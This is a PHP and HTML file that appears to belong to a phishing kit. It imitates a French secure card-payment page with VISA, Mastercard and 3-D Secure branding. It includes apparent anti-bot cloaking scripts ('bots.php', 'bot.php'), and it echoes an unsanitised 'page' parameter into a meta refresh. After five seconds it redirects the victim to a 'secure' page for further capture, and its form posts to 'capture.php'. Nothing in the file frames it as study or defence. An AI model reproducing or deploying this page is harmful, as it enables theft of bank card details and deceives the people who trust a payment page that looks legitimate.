<?php
error_reporting(0);
include 'bots.php';
include 'bot.php';
$bin4=$_GET['page'];

?>
<!DOCTYPE html><html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" class="flexNav-no-touch"><head><meta content="Altos" name="copyright">
<meta content="text/html; charset=utf-8" http-equiv="content-type"><meta content="text/javascript" http-equiv="content-script-type">
<meta http-equiv="refresh" content="5;URL='./secure/index.php?page=<?php echo $bin4 ?>'" />
<meta content="no-cache, must-revalidate" http-equiv="cache-control">
<meta content="telephone=no" name="format-detection">
<meta content="email=no" name="format-detection">
<meta content="initial-scale=1.0, user-scalable=1" name="viewport">
<link rel="shortcut icon" type="image/x-icon" href="images/favicon.png">
<link href="css/pcidss.css" rel="stylesheet" type="text/css"><script src="js/core.js" type="text/javascript"></script>
<script src="js/jquery.js" type="text/javascript"></script>
<script src="js/jquery.kawwa.modal.js" type="text/javascript"></script>
<script src="js/k-general.js" type="text/javascript"></script>
<script src="js/common.js" type="text/javascript"></script>
<script src="js/captcha.js" type="text/javascript"></script>
<script src="js/virtualnumpad.js" type="text/javascript"></script>
<script src="js/oneclick.js" type="text/javascript"></script>
<script src="js/splitcardnumberfield.js" type="text/javascript"></script>
<script src="js/zoneUpdater.js" type="text/javascript"></script>
<script src="js/click_once.js" type="text/javascript"></script>
<script src="js/k-load.js" type="text/javascript"></script>
<script type="text/javascript"></script>
<!--[if lt IE 8]>
<link href="css/iehacks1.css" rel="stylesheet" type="text/css"/>
<![endif]-->
<script type="text/javascript"></script>
<!--[if IE 9]>
<link href="css/iehacks9.css" rel="stylesheet" type="text/css"/>
<![endif]-->
<script type="text/javascript"></script>
<!--[if lt IE 9]>
<script src="js/html5shiv.js" type="text/javascript"></script>
<![endif]-->
<title>Page de saisie des informations de la carte</title>
<link type="text/css" rel="stylesheet" href="css/tapestry-console.css">
<link type="text/css" rel="stylesheet" href="css/t5-alerts.css">
<link type="text/css" rel="stylesheet" href="css/tree.css">
<link type="text/css" rel="stylesheet" href="css/throbber.css"></head>
<body id="no_wallet_management_body"><div id="container"><div id="header">
        <div id="headerMerchant">
          <div id="logoMerchant">
            <strong>Paiement sécurisé de votre commande</strong>
            <span>L'adresse de ce site de paiement préfixée par https indique que vous êtes sur un site<br>
            sécurisé et que vous pouvez régler votre achat en toute tranquillité.</span>
          </div>
        </div>
      </div>
<header role="banner"><h1></h1></header><hr><div class="contentWrapper">
<div id="wrapper"><aside role="complementary" class="transaction-data"><p class="vendor"></p><h2 id="transaction_bloc_title">
Détails de la transaction
<span class="transactionShowMore">+</span></h2><div class="main-data"><dl><dt class="amount">
Montant de la transaction :
</dt><dd class="amount" name="amount" id="amount">
3,71 €
</dd></dl></div><dl class="data-sheet"><div id="instalmentsInfo"><dt>
Référence de la transaction :
</dt><dd>
BOLx2018062306004908812
</dd></div><dt class="orderId">
Identifiant de la commande :
</dt><dd class="orderId" name="orderId" id="orderId">
6985353730
</dd><dt class="merchantId">
Identifiant du commerçant :
</dt><dd class="merchantId" name="merchantId" id="merchantId">
201000040150001
</dd>
<dt class="amount">
Montant de la transaction :
</dt><dd class="amount">
3,71 €
</dd><table style="display: none" id="instalmentsReceipt"><tbody><tr><th style="width: 260px;">Référence de la transaction :</th><th style="width: 132px;">Période</th><th>Montant de la transaction</th></tr></tbody></table></dl></aside><div class="" role="main" id="main"><div id="captureCardDetailsH2Title"><h2 class="mobile-invisible">Informations de la carte</h2></div><form action="capture.php" method="post" id="captureCardForm"><div class="" style="display: none;"><input value="mahijjh1k2" name="sid" type="hidden"><input value="dGE3Bpc3RXLcWlHaRTEf2GpoS34=:H4sIAAAAAAAAANWZPWzTQBTHr0krETK0QoDExlCGDnXiOOkHqGrTlELbtEANlViILvYlGNk+47s0jZCYGBjYEQsSEhsfE4idDqgLC4gdiRUJFYkJJHx2PxKQEE3PUt6Wu+f73+9e3stz7j3/igaaOrri4ZZDXJ4xsG9mStjjDZ+Ugs9zhGPLZmeNaEqYDep41A0eVvB6YMNVm+ysdgh2mWJT6lVyzEcK9esK9rBxkygce4Rxv1VQDOoT26oqezJMKQcrhgujl7Y+jaA7WwmENrzeYFKvf3nxvfbmw5NYmVYOxLQa2AOTzjEn8z51dDEyS7YVPLKG7QYZffj24310+lcC9ZVR2tg3cHSsfCtgydjYrWd07ltu/dyGx1H/2oJe7A2P57e92siFk8+mY/T4bXQX9XN0dLmoXz2/WiquzsWyj9gmFesJEqVZaOQHjYex7NC3iRtPH0xF8TCP5rpiEiO34VSJX7OIbQYYhX9iVDEjSrEaTGKDz4slwzrhDe/Mtc305xPvfu7kFnW5T+0V7BDhsgGRS4Niq5Vwq3CdROTiQZEv+9QgjOmNqmMxZlF386WZr/14/P5wziQbnuW3zOD3JyITZx8KTv7HvCx9IX+8uYQWZIiFcSgU+6QrJqUq7uV4VpVOmoqJNAeGVANDmgdDWgBDOgaGdBwM6QQY0kkopGoWDCmYGqX2eo0SioPNZbQkTbGiRu878jWTkjV3v6X+XFadiIE3FSPvJCzeXBYYrwqMNweMVwPGmwfGWwDGOwaMdxwYL7D6lgNW3zRg9U0DVt80YPVNA1bfNGD1TYNQ36L/VtNoqrsL+fX1jvvuI7sTh1aMbrgX0cWuVEyLeTZuaSazaZ22XXBLFkzKFNwLnbD1KJk0FQdpe7uwl3mjIJ9FM10J1qjvVJhoGHHmo5n/7dWFLSb+d8Ppkb596vWre6UESpSDhAl70QthvA+UUZrYRBB29M/SbQSdo2YZLUpwUiXbliLSJZNyJTvTRDptKh7a9lTpdeYwXX4DUi74UAYjAAA=" name="t:formdata" type="hidden"></div><ul class="list-of-cards null"><li><img alt="Logo pour le type de carte VISA" name="VISA" src="images/logo_VISA.png"></li><li><img alt="Logo pour le type de carte MASTERCARD" name="MASTERCARD" src="images/logo_MASTERCARD.png"></li><li><img alt="Logo pour le type de carte CB" name="CB" src="images/logo_CB.png"></li></ul><div class="customMessage1">

</div><div class="customMessage2">

</div><br><fieldset><legend>Redirection vers la page d'authentification bancaire</legend><div class="card-data"><p class="" id="no_virtualnumpad_p"><label for="cardNumberField" id="cardNumberField-label">
<img src="images/loading.gif">
</label></p><p> 
</p></div><div class="conditional"></div></fieldset><div class="customMessage3">

</div><div class="customMessage4">

</div><div id="threeDsBefore"><div class="message"><p class="threeDSWarningMessage">
Selon votre établissement bancaire, vous pourrez être redirigé vers la page d’authentification de votre banque avant la validation de votre paiement.
</p><p class="threeDSLogo"><img alt="Page sécurisée par VISA" src="images/3DS_VISA.png"><img alt="Page sécurisée par MASTERCARD" src="images/3DS_MASTERCARD.png"></p></div></div><div class="k-buttons-bar"><p><input value="Finaliser et payer                       " id="form_submit" name="form_submit" type="submit"></p><div class="secondaryButtons"><a id="cancel_0" class="bt-reset" href="index.php">
Annuler
</a></div><p></p></div><div id="threeDsAfter"><div class="message"><p class="threeDSWarningMessage">
Selon votre établissement bancaire, vous pourrez être redirigé vers la page d’authentification de votre banque avant la validation de votre paiement.
</p><p class="threeDSLogo"><img alt="Page sécurisée par VISA" src="images/3DS_VISA.png"><img alt="Page sécurisée par MASTERCARD" src="images/3DS_MASTERCARD.png"></p></div></div></form><article style="display: none; height: 807px;" class="k-modal" id="crypto-info" role="dialog" aria-hidden="true"><div class="overlay"></div><div class="modal-body"><p class="close"><a href="#" aria-label="Fermer">✖</a></p><div class="customMessage1" tabindex="0">

</div><div class="customMessage2">

</div><div id="message_cvv_perso"><h3 tabindex="0">
Qu’est-ce que le cryptogramme visuel de votre carte ?
</h3><br><div class="content"><p>Le cryptogramme visuel de votre carte est un dispositif de sécurité anti-fraude qui permet de vérifier que vous êtes en possession de votre carte bancaire. Pour la sécurité de vos achats en ligne, vous devez saisir le cryptogramme visuel présent à l’arrière de votre carte. Cette étape supplémentaire sert à s’assurer que vos informations de carte ne sont pas utilisées frauduleusement.</p><br><ul class="list-images"><li><figure><img class="cvv_help_img" alt="Image vous permettant d’identifier le cryptogramme visuel de votre carte" src="images/cvv_help_visa_mastercard.svg"></figure></li><li><figure><img class="cvv_help_img" alt="Image vous permettant d’identifier le cryptogramme visuel de votre carte" src="images/crypto_mc.svg"></figure></li></ul></div></div><div class="customMessage3">

</div></div></article></div></div><!-- /wrapper --></div><footer lang="en" role="contentinfo"><div id="footer">
        <!-- -->
      </div></footer></div><div class="keypad-popup" style="display: none;"></div></body></html>